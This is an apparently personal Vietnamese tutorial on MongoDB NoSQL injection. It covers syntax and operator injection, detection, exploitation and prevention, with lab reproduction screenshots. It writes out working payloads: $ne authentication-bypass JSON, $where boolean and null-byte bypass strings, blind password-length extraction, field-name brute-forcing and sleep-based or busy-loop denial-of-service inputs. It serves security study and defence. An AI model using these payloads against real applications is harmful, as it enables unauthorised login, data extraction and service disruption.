# NoSQL injection

## **WHAT IS NOSQL DATABASE ?**

`Nosql`  là một loại cơ sở dữ liệu không sử dụng các bảng dữ liệu quan hệ trong cơ sở dữ liệu truyền thống . Thay vào đó nó sử dụng các mô hình dữ liệu linh hoạt và có thể mở rộng dễ dàng 

Các loại cơ sở dữ liệu `nosql` phổ biến  : 

- Document database :  Dữ liệu được lưu trữ dưới dạng tài liệu , thường là JSON , BJSON hoặc XML
- Graph Database : Dữ liệu được lưu trữ dưới các dạng đỉnh , note và cạnh
- Key-Value Store :  Ví dụ như `redis`

Một ví dụ phổ biến đó là MongoDB 

là một cơ sở dữ liệu dưới dạng document database 

Đặc điểm  : 

- Lưu tài liệu dưới dạng JSON

```jsx
{
  "user_id": 1,
  "name": "John Doe",
  "email": "john.doe@example.com"
}

```

- Không có lược đồ cố định ,  mở rộng dễ dàng

Ví dụ ban đầu có JSON như sau : 

```jsx
{
  "user_id": 1,
  "name": "John Doe",
  "email": "john.doe@example.com"
}

```

Sau đó cần thêm thông tin địa chỉ , có thể thêm trường ‘`address`’  mà không cần thay đổi cấu trúc ban đầu 

```jsx
{
  "user_id": 1,
  "name": "John Doe",
  "email": "john.doe@example.com",
  "address": {
    "street": "123 Main St",
    "city": "Anytown",
    "state": "CA",
    "zip": "12345"
  }
}

```

## What is the bug  ?

NoSQL injection là bug khi untrusted-data từ phía người dùng được sử dụng vào trong câu truy vấn của ứng dụng đến có thể chèn thêm truy vấn ngoài logic của người dùng 

Ví dụ  : 

```jsx
db.myCollection.find( { active: true, $where: function()
 { return obj.credits—obj.debits < $userInput; } } );;
```

`UserInput` được nối chuỗi trực tiếp vào truy vấn .

Nếu như input là như sau : 
`0;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000)`

Thì cả câu truy vấn sẽ thành như sau : 

```jsx
function() { return
 obj.credits—obj.debits < 0
 ;var date=new Date(); do{curDate = new Date();}while(curDate-date<10000); }
```

⇒ DOS 

Trường hợp như này mình ko cần escape chuỗi 

- Trường hợp sau cần escape

```jsx
const products = await collection.find({
            $where: `this.category == '${category}'`
        }).toArray();
```

Lúc đó mình cần thoát chuỗi và nối chuỗi  : 

ví dụ  : `userinput`  = **Gifts'+’**

```jsx
const products = await collection.find({
            $where: `this.category == 'Gifts' + '' ` // cả cục '' được gọi là mã javascript
        }).toArray();
```

Thì đoạn đằng sau theo ngữ cảnh `Javascript` đằng trong `` được coi là mã `javascript` 

 và nối chuỗi `'Gifts' + ''` = Gift nên hoàn toàn hợp lệ 

## **How many type  ?**

- **Syntax Injection**
    
    Điều này xảy ra khi user-input được sử dụng trong mệnh đề **$where** của truy vấn ⇒  `execute` mã `Javascript` 
    
- **Operator injection**
    
    Trong `Nosql` thì thường sử dụng query operator 
    
    - `$**where**` :  Match documents thỏa mãn a `Javascript expression`
    - `$ne` :  not -equal : match all value that  are not equal specific value
    - `$in` :  Match all value of specific array
    - `$regex` :  Select documents where values match
    
    Ví dụ : 
    
    Cách sử dụng các toán tử : 
    
    1. **$ne**
    
    ```jsx
     const users = await db.collection('users').find({ username: { $ne: username } })
    ```
    
    1. $in 
    
    ```jsx
    **const users = await db.collection('users').find({ username: { $in: usernames }})**
    ```
    

## Thông tin thêm

Cách mà một ứng dụng query dữ liệu < **để hiểu context của untrusted-data** > 

Example : 

```jsx
app.post("/login", async function(req, res){
    try {
        // check if the user exists
        const user = await User.findOne({ username: req.body.username });
        if (user) {
          //check if password matches
          const result = req.body.password === user.password;
          if (result) {
            res.render("secret");
          } else {
            res.status(400).json({ error: "password doesn't match" });
          }
        } else {
          res.status(400).json({ error: "User doesn't exist" });
        }
      } catch (error) {
        res.status(400).json({ error });
      }
});
```

`Untrusted-data` ở đây chính là `req.body.username`   , trong context mà ứng dụng thực hiện truy vấn như thế này ⇒ Test `Operator Injection` 

```jsx
//Nếu giá trị truyền lên là
{"username":{"$ne":"invalid"} 
=> req.body.username  = {"$ne" : "invaild"} 
// câu truy vấn sẽ trông như thế này 
 await User.findOne({ username: {"$ne" : "invaild"}  }); 
 //lấy tất cả username ngoại trù invalid 
```

## IMPACT ?

- bypass authentication
- extract or edit data
- DOS
- Execute on server side

## How to detect  ?

### Detect Syntax injection

Fuzzing ⇒ làm break syntax của $where ⇒ analysis response ( status code, length, time response ) 

Timebase : `‘ sleep(5000)` 

```java
' " \ ; { }
;$Foo}
$Foo \xYZ%00  // null byte để break chuỗi , missing ;  <thiếu ; >

```

Test nối chuỗi rỗng  : 

![Untitled](NoSQL%20injection%20aba554fd712a4b99ab64cb22e001ea2b/Untitled.png)

Nếu đúng context của javascript thì nó sẽ vẫn trả về content giống với khi mình truyền  : `wiener` và khi truyền  `wiener’ + ‘` 

Bước tiếp theo  :  Thao túng `Boolean` 

- **Determining  which  character are processed**
    
    Xem sét những kí tự nào đang được thông dịch dưới dạng là `syntax` bởi ứng dụng  ,
    
    inject từng kí tự ; `‘` and  `\’` ⇒ confirm việc break syntax 
    

Nhớ URL encoding ⇒ rồi mới gửi

Example :  

```jsx
const products = await collection.find({
            $where: "this.category == '${category}' "
        }).toArray();
```

escape ra ngoài ⇒ chèn đúng cú pháp mã `javascript` 

Ví dụ payload  :   Gift’ || 1 || ‘x      ; vì cả $where nó sẽ nhận giá trị boolean , nó đi từng bản ghi , nếu `$where` = true thì nó lấy 

thì truy vấn sẽ thành ra như sau  :  

```jsx
   $where: "this.category == 'Gifts' || 1 || 'x' "
```

vì 1  luôn true  ⇒ lấy ra tất bản ghi 

Comment trong **mongoDB**  là `null character` 

```jsx
this.category == 'fizzy'\u0000' && this.released == 1
```

If MongoDB ignores all characters after the null character, this removes the requirement for the released field to be set to 1. As a result, all products in the `fizzy` category are displayed, including unreleased products.

### Operator Injection

Đầu tiên mình confirm với nhau một việc là nó không phải là **syntax injection** 

Test xem liệu rằng nó có work với việc mình `inject operator` không  ? 

Bằng việc so sánh 2 request 

1 . Request ban đầu  : 

```jsx
{
"username":"wiener",
"password":"peter"
}
```

Nếu ban đầu mình sử dụng cái này đăng nhập ⇒ 302  ⇒  được cấp session ⇒  redirect về / 

1. Request inject 

```jsx
{"username":{
"$eq":"wiener"
},"password":"peter"}
```

Lấy những document có username bằng `$eq` với “wiener”    và password bằng “`peter`” 

![Untitled](NoSQL%20injection%20aba554fd712a4b99ab64cb22e001ea2b/Untitled%201.png)

Việc này cho thấy rằng bên back end ⇒  có compiler operator mình truyền vào ! 

## **How to exploit ?**

- **Syntax injection**
    1. Extract value dựa vào `boolean` 
    
    ```jsx
    ' || this.username = 'administrator' && /^8/.test(this.password.length) || 'a' == 'b
    ```
    
    nếu độ dài một khẩu của user administrator = 8 ⇒  thì truy vấn trả về true , và nó sẽ lấy bản ghi đầu tiên 
    
    ```jsx
    Content-Type: application/json
    {
    	"username":{
    		"$ne":"invalid"
    	},
    	"password":{
    		"peter"
    		}
    }
    Hoặc
    Content-Type: application/x-www-form-urlencoded
    username[$ne]=invalid&&password=peter
    ```
    
    2 . Extract các file của object 
    
    Cách mà kiểm tra xem 1 key của 1 object có tồn tại không  ? 
    
    ```jsx
    1. undefined 
    this.username !== undefined  //  có tồn tại 
    ```
    
    Cách brute-force tên của trường ẩn , của 1 object 
    
    ```jsx
    "$where":"Object.keys(this)[0].match('^.{0}a.*')"
    ```
    
    ## How to prevent ?
    
    Làm sạch dữ liệu , sử dụng allowed list các kí tự cho phép 
    
    Không nối trực tiếp dữ liệu từ người dùng vào truy vấn 
    
    Prevent operator injection  ⇒  chỉ chấp nhận những key cho phép 
    

## Reproduce bug

Các  trường hợp code của các các context khác nhau  : 

Context `Operator Syntax`  : 

![Untitled](NoSQL%20injection%20aba554fd712a4b99ab64cb22e001ea2b/Untitled%202.png)

khi biến username được đưa trực tiếp vào trong `findOne`   

```jsx
//lưu ý 
findOne(username) = findOne(username:username) // cú pháp mới của ES6 
```

lúc này mình có thể truyền được các operator khác 

Ví dụ  :

Trong CSDL có :

![Untitled](NoSQL%20injection%20aba554fd712a4b99ab64cb22e001ea2b/Untitled%203.png)

```jsx
//data ban đầu 
{
  "username":"alice",
  "password": "password123",
}

```

![Untitled](NoSQL%20injection%20aba554fd712a4b99ab64cb22e001ea2b/Untitled%204.png)

Vẫn nhận được token ⇒ confirm `operator syntax` 

Nhưng nếu truyền:

![Untitled](NoSQL%20injection%20aba554fd712a4b99ab64cb22e001ea2b/Untitled%205.png)

Lỗi  : `$where cannot be applied to a field`

Trường hợp này : chỉ có thể chèn được các `operator`  mà trước nó là filed 

```jsx
{ field: { $eq: value } } // bằng 
{ field: { $ne: value } } // khác 
{ field: { $in: [value1, value2] } } // nằm trong 
{ field: { $regex: /pattern/ } }  // regex

 

```

Trong trường này :  broken authentication with condition < biết mật khẩu cơ bản để mò > 

![Untitled](NoSQL%20injection%20aba554fd712a4b99ab64cb22e001ea2b/Untitled%206.png)

vì là `FindOne` nên nó sẽ lấy bản ghi đầu tiên 

Trường hợp  check cả hai yếu tố thì có thể dễ dàng bypass 

![Untitled](NoSQL%20injection%20aba554fd712a4b99ab64cb22e001ea2b/Untitled%207.png)

```jsx
{
  "username":{"$ne":""},
  "password":{"$ne":""}
}
```

Context `Syntax injection` 

Syntax injection xảy ra khi untrusted-data dơi vào mệnh đề `$where` 

![Untitled](NoSQL%20injection%20aba554fd712a4b99ab64cb22e001ea2b/Untitled%208.png)

ở đây thì `username` và `password` là hai **untrusted-data , và nối chuỗi trực tiếp vào truy vấn** 

Nằm trong `` => là string đại diện cho **javascript expression** 

![Untitled](NoSQL%20injection%20aba554fd712a4b99ab64cb22e001ea2b/Untitled%209.png)

Dùng  Null byte để comment đoạn mã check password phía sau ! ⇒ **bypass authentication** 

Ngoài ra có thể sử dụng một số hàm được sử dụng trong context cho phép để extract data ⇒

Time-base : 

Nếu **False**

![Untitled](NoSQL%20injection%20aba554fd712a4b99ab64cb22e001ea2b/Untitled%2010.png)

Nếu **True** 

![Untitled](NoSQL%20injection%20aba554fd712a4b99ab64cb22e001ea2b/Untitled%2011.png)

Trường hợp back-end nhận tất cả giá trị vào ⇒  có thể injection thêm `$where` 

![Untitled](NoSQL%20injection%20aba554fd712a4b99ab64cb22e001ea2b/Untitled%2012.png)

Thì lúc này mình có thể injetion thêm `$where` 

```jsx
  	{
    "username":"alice",
    "password":"password123",
    "$where":"sleep(5000)"
    }
```